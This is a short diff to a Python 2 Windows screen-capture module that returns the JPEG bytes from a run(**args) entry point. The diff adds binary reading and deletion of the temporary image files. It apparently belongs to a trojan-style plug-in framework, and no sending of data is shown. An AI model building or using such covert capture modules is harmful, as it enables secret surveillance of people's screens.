@@ -4,6 +4,7 @@ import win32con
 import win32api
 
 import PIL.Image
+import os
 
 
 def bmp2jpg(bmp, jpg):
@@ -36,13 +37,21 @@ def get_screenshot():
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
-    ff = open(jpg, "r")
+    ff = open(jpg, "rb")
     data = ff.read()
+    ff.close()
+
+    os.remove(bmp)
+    os.remove(jpg)
     return data
+    
 
 
 def run(**args):
     print "[*] In screenshot module."
     data = get_screenshot()
+    #print len(data)
     #data = "done"
     return data
+
+#print run()
